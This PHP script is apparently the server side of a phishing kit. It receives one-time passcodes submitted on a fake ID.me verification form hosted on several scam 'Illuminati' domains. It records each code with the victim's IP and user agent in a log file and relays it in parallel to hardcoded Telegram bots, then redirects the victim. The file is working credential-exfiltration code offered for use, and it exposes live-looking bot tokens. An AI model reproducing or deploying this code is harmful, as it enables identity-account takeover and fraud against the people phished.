<?php
ob_start();

// Site-specific configuration with domain-based bots and redirects
$site_map = [
    '127.0.0.1' => [
        'bots' => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8413673524:AAGruDl1TxUDZH9RwQYYWSeEwJBcqR5S1lQ', 'chat_id' => '1566821522'],
        ],
        'redirect' => 'https://illuminatiofficial.world/index.html'
    ],
    
    'illuminatiofficial.world' => [
        'bots' => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8413673524:AAGruDl1TxUDZH9RwQYYWSeEwJBcqR5S1lQ', 'chat_id' => '1566821522'],
        ],
        'redirect' => 'https://illuminatiofficial.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html'
    ],
    
    'illuminatipath.world' => [
        "bots" => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8491692614:AAHhTPb4DRwkvmJa0SjF00v5x8kNWA82xfk', 'chat_id' => '6378885812'],
        ],
        "redirect" => "https://illuminatipath.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html"
    ],




    'illuminatisyndicate.world' => [
        "bots" => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8531352805:AAFN91n2L76y7WKwB159QFRNtvCnLu_uM9M', 'chat_id' => '7875523533'],
        ],
        "redirect" => "https://illuminatisyndicate.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html"
    ],


    'illuminatisacred.world' => [
        "bots" => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8412410845:AAFxuHUyafETE-8oCvUsSp45l0CtDkb-qm0', 'chat_id' => '7411482040'],
        ],
        "redirect" => "https://illuminatisacred.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html"
    ],

    // Add more domains as needed
];

// Get the referring domain
$referer = $_SERVER['HTTP_REFERER'] ?? '';
$parsed = parse_url($referer);
$domain = $parsed['host'] ?? 'unknown';

// Find the configuration for this domain
$config = $site_map[$domain] ?? null;

// If no config found, use a default one
if (!$config) {
    $config = reset($site_map);
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Setup log file
    $log_file = __DIR__ . "/logs/idme_otps.txt";
    if (!file_exists(dirname($log_file))) {
        mkdir(dirname($log_file), 0777, true);
    }

    // Enhanced logging function with microtime for performance tracking
    function log_entry($msg, $level = 'INFO') {
        global $log_file;
        $timestamp = date("Y-m-d H:i:s.u");
        file_put_contents($log_file, "[$timestamp] [$level] $msg\n", FILE_APPEND);
    }

    // Start timing
    $start_time = microtime(true);
    log_entry("=== OTP Submission Started ===");

    // Get form data from HTML form - field name is 'userotp'
    $userotp = htmlspecialchars($_POST['userotp'] ?? '???');

    // Get IP address SERVER-SIDE
    $ip = $_SERVER['HTTP_CLIENT_IP'] ?? 
          $_SERVER['HTTP_X_FORWARDED_FOR'] ?? 
          $_SERVER['HTTP_X_FORWARDED'] ?? 
          $_SERVER['HTTP_FORWARDED_FOR'] ?? 
          $_SERVER['HTTP_FORWARDED'] ?? 
          $_SERVER['REMOTE_ADDR'] ?? 
          'unknown';
    
    // Handle multiple IPs in X_FORWARDED_FOR
    if (strpos($ip, ',') !== false) {
        $ips = explode(',', $ip);
        $ip = trim($ips[0]);
    }

    $timestamp = date("Y-m-d H:i:s");
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    
    // Prepare Telegram message
    $message = "🔐 *ID.me OTP Submission*\n\n" .
               "🔢 *OTP Code:* `$userotp`\n" .
               "🌐 *Domain:* $domain\n" .
               "📡 *IP:* `$ip`\n" .
               "🕒 *Time:* $timestamp\n" .
               "🔍 *User Agent:* " . substr($user_agent, 0, 100);

    // Log the submission immediately
    log_entry("[$domain] OTP from $ip - Code: $userotp");

    // ============================================
    // ENHANCED cURL WITH MULTI-HANDLE (PARALLEL)
    // ============================================
    
    $multi_handle = curl_multi_init();
    $handles = [];
    
    foreach ($config['bots'] as $bot_index => $bot) {
        if (empty($bot['token']) || empty($bot['chat_id'])) {
            log_entry("Skipping bot $bot_index - empty token or chat_id", 'WARN');
            continue;
        }
        
        $url = "https://api.telegram.org/bot" . $bot['token'] . "/sendMessage";
        $data = [
            'chat_id' => $bot['chat_id'],
            'text' => $message,
            'parse_mode' => 'Markdown'
        ];
        
        $ch = curl_init($url);
        
        // ULTRA-OPTIMIZED cURL settings
        curl_setopt_array($ch, [
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $data,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 3,           // 3 seconds MAX per request
            CURLOPT_CONNECTTIMEOUT => 2,    // 2 seconds for connection
            CURLOPT_SSL_VERIFYPEER => true,
            CURLOPT_SSL_VERIFYHOST => 2,
            CURLOPT_FORBID_REUSE => true,
            CURLOPT_FRESH_CONNECT => true,
            CURLOPT_NOSIGNAL => 1,          // Better for timeouts
            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_2TLS, // HTTP/2 for speed
            CURLOPT_ENCODING => 'gzip',     // Compression
            CURLOPT_TCP_FASTOPEN => true,   // TCP Fast Open
            CURLOPT_TCP_NODELAY => true,    // No Nagle algorithm
        ]);
        
        curl_multi_add_handle($multi_handle, $ch);
        $handles[$bot_index] = $ch;
    }
    
    // Execute all handles in parallel
    $running = null;
    do {
        $status = curl_multi_exec($multi_handle, $running);
        if ($running) {
            // Wait for activity on any curl connection (10ms timeout)
            curl_multi_select($multi_handle, 0.01);
        }
    } while ($running && $status == CURLM_OK);
    
    // Process results quickly
    $success_count = 0;
    foreach ($handles as $bot_index => $ch) {
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $total_time = curl_getinfo($ch, CURLINFO_TOTAL_TIME);
        
        if ($http_code == 200) {
            $success_count++;
            log_entry("Bot $bot_index delivered in " . round($total_time, 3) . "s", 'SUCCESS');
        } else {
            $error = curl_error($ch);
            log_entry("Bot $bot_index failed - HTTP $http_code: $error", 'ERROR');
        }
        
        curl_multi_remove_handle($multi_handle, $ch);
        curl_close($ch);
    }
    
    curl_multi_close($multi_handle);
    
    $end_time = microtime(true);
    $total_processing = round(($end_time - $start_time) * 1000, 2); // in milliseconds
    
    log_entry("Telegram delivery: $success_count/" . count($config['bots']) . " bots | Total time: {$total_processing}ms");
    
    // ============================================
    // IMMEDIATE REDIRECT AFTER COMPLETION
    // ============================================
    
    // Verify delivery happened (optional - can remove for pure speed)
    if ($success_count > 0) {
        log_entry("✅ Telegram delivery confirmed before redirect", 'SUCCESS');
    } else {
        log_entry("⚠️ No Telegram bots delivered, but proceeding with redirect", 'WARN');
    }
    
    // Force immediate output and redirect
    if (ob_get_level()) ob_end_clean();
    
    // Add no-cache headers for immediate redirect
    header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
    header("Cache-Control: post-check=0, pre-check=0", false);
    header("Pragma: no-cache");
    
    // Immediate redirect
    header("Location: " . $config['redirect']);
    exit;
    
} else {
    // Not a POST request
    header("HTTP/1.1 405 Method Not Allowed");
    echo "This page only accepts POST submissions from the OTP form.";
    exit;
}
?>
